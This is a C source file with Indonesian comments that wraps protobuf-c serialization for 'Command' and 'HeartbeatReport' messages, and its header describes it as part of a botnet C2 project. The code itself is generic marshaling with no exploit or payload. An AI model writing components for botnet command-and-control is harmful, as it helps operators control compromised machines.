/**
 * @file protocol.pb-c.c
 * @brief Implementasi marshaling dan unmarshaling Protobuf menggunakan protobuf-c.
 * Berdasarkan struktur direktori botnet C2.
 */

#include "core/protocol.pb-c.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/**
 * @brief Melakukan marshal (serialisasi) pesan Command dari struct C ke buffer byte.
 * 
 * @param msg Pointer ke struct Command yang akan di-marshal.
 * @param out_len Pointer untuk menyimpan panjang buffer hasil marshal.
 * @return uint8_t* Pointer ke buffer byte baru (harus dibebaskan dengan free_serialized_buffer).
 */
uint8_t *serialize_command(const Command *msg, size_t *out_len) {
    if (!msg || !out_len) {
        return NULL;
    }

    // Mendapatkan ukuran buffer yang dibutuhkan
    *out_len = command__get_packed_size(msg);
    if (*out_len == 0) {
        return NULL;
    }

    // Alokasi memori untuk buffer output
    uint8_t *buffer = malloc(*out_len);
    if (!buffer) {
        return NULL;
    }

    // Melakukan packing (serialisasi) data ke dalam buffer
    command__pack(msg, buffer);
    return buffer;
}

/**
 * @brief Melakukan unmarshal (deserialisasi) byte stream ke struct Command C.
 * 
 * @param data Pointer ke buffer byte input.
 * @param len Panjang buffer byte input.
 * @return Command* Pointer ke struct Command (harus dibebaskan dengan free_command_struct).
 */
Command *deserialize_command(const uint8_t *data, size_t len) {
    if (!data || len == 0) {
        return NULL;
    }

    // Melakukan unpacking (deserialisasi) dari buffer byte ke struct C
    Command *msg = command__unpack(NULL, len, data);
    return msg;
}

/**
 * @brief Membersihkan alokasi memori buffer hasil serialisasi.
 * 
 * @param buffer Pointer ke buffer yang dialokasikan saat serialize.
 */
void free_serialized_buffer(uint8_t *buffer) {
    if (buffer) {
        free(buffer);
    }
}

/**
 * @brief Membersihkan alokasi memori struct Command setelah di-unpack.
 * 
 * @param msg Pointer ke struct Command.
 */
void free_command_struct(Command *msg) {
    if (msg) {
        // Menggunakan fungsi free unpack bawaan protobuf-c
        command__free_unpacked(msg, NULL);
    }
}

/**
 * @brief Melakukan marshal (serialisasi) pesan Heartbeat dari struct C ke buffer byte.
 */
uint8_t *serialize_heartbeat(const HeartbeatReport *msg, size_t *out_len) {
    if (!msg || !out_len) {
        return NULL;
    }

    *out_len = heartbeat_report__get_packed_size(msg);
    if (*out_len == 0) {
        return NULL;
    }

    uint8_t *buffer = malloc(*out_len);
    if (!buffer) {
        return NULL;
    }

    heartbeat_report__pack(msg, buffer);
    return buffer;
}

/**
 * @brief Melakukan unmarshal (deserialisasi) byte stream ke struct Heartbeat C.
 */
HeartbeatReport *deserialize_heartbeat(const uint8_t *data, size_t len) {
    if (!data || len == 0) {
        return NULL;
    }

    HeartbeatReport *msg = heartbeat_report__unpack(NULL, len, data);
    return msg;
}

/**
 * @brief Membersihkan alokasi memori struct Heartbeat setelah di-unpack.
 */
void free_heartbeat_struct(HeartbeatReport *msg) {
    if (msg) {
        heartbeat_report__free_unpacked(msg, NULL);
    }
}

